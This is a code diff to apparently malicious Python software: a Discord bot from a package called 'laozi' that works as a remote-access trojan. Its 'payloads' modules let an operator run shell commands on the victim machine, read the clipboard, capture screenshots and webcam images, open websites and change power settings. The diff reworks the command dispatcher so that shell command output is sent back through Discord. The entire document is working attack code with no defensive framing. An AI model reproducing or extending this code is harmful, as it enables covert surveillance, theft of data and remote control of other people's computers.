@@ -1,6 +1,4 @@
 import os
-import platform
-import sys
 from discord import Client, File
 from laozi.payloads.systeminfo import get_sys_info
 from laozi.payloads.clipboard import get_clipboard
@@ -43,25 +41,22 @@ class DiscordBotClient(Client):
 
         commands = {
             "!sysinfo": self.handle_system_info,
-            "!execute": self.execute_shell_command,
-            "!alert": self.trigger_messagebox,
+            "!execute": self.handle_execute_command,
+            "!alert": self.handle_alert_command,
             "!clipboard": self.handle_clipboard,
-            "!website": open_website,
+            "!website": self.handle_website_command,
             "!webcam": self.handle_webcam_snapshot,
             "!screenshot": self.handle_screenshot,
-            "!voice": play_voice,
+            "!voice": self.handle_voice_command,
             "!power": self.handle_power_options,
         }
 
         handler = commands.get(command)
-        has_param = ["!execute", "!alert", "!website", "!voice", "!power"]
+        commands_with_args = {"!execute", "!alert", "!website", "!voice", "!power"}
 
         if handler:
-            if command in has_param:
-                if not args:
-                    await message.channel.send(f"Usage: `{command} <parameter>`")
-                else:
-                    await handler(message.channel, args)
+            if command in commands_with_args and not args:
+                await message.channel.send(f"Usage: `{command} <parameter>`")
             else:
                 await handler(message.channel, args)
         elif command.startswith("!"):
@@ -103,16 +98,28 @@ class DiscordBotClient(Client):
         else:
             await channel.send("Failed to capture screenshot.")
 
-    @staticmethod
-    def execute_shell_command(command):
-        os.system(command)
+    async def handle_execute_command(self, channel, command):
+        output = os.popen(command).read()
+        await channel.send(f"Executed command:\n```{command}```\nOutput:\n```{output}```")
 
-    @staticmethod
-    def trigger_messagebox(message_text):
+    async def handle_alert_command(self, channel, message_text):
         display_messagebox(message_text, "System Alert", "info")
+        await channel.send(f"Alert displayed: `{message_text}`")
+
+    async def handle_website_command(self, channel, url):
+        success = open_website(url)
+        if success:
+            await channel.send(f"Website opened: `{url}`")
+        else:
+            await channel.send(f"Failed to open website: `{url}`")
+
+    async def handle_voice_command(self, channel, text):
+        play_voice(text)
+        await channel.send(f"Played voice message: `{text}`")
 
     async def handle_power_options(self, channel, option):
         try:
             set_power_options(option)
+            await channel.send(f"Power option `{option}` executed.")
         except ValueError as e:
-            await channel.send(str(e))
+            await channel.send(f"Error: {str(e)}")
